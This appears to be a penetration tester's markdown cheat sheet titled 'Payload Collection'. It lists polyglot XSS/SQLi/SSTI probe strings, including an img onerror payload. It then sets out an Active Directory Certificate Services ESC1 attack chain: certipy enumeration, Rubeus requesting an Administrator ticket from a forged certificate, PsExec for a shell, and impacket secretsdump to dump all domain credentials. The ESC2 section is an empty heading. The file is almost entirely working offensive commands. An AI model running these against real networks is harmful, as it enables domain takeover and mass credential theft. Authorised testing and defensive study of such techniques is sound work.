# Payload Collection

# XSS, SQLi, SSTI, etc.

``` 
'"`><img src=x>${{7*7}}
💋img src=x onerror=alert(document.domain)//💛
```

# Active Directory

## AD CS
```
certipy find -u 'user@domain' -p 'Password' -dc-ip '10.0.0.55'
certipy find -u 'user@domain' -p 'Password' -dc-ip '10.0.0.55' /vulnerable
certipy find 'domain/user:Password@dc.domain.local' -old-bloodhound

# ESC1
.\Rubeus.exe asktgt /domain:domain /dc:dc.domain /user:Administrator /certificate:esc1.pfx /ptt
.\PsExec.exe -accepteula \\ cmd
## proceed on linux
.\Rubeus.exe asktgt /domain:domain /dc:dc.domain /user:Administrator /certificate:esc1.pfx /nowrap /outfile:ticket.kirbi
python3 /opt/impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
python3 /opt/impacket/examples/secretsdump.py domain/domainadmin@dc.domain.local -k -no-pass -outfile dcsync.txt

# ESC2
``` 
